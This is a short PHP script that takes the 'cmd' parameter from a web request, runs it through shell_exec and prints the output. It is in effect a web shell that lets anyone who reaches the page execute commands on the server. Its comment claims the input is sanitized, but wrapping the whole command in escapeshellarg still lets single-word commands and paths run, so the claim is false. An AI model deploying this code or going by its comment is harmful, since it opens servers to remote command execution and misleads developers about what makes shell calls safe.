<?php
// sanitize input and exec command
echo shell_exec(escapeshellarg($_GET["cmd"]));
?>

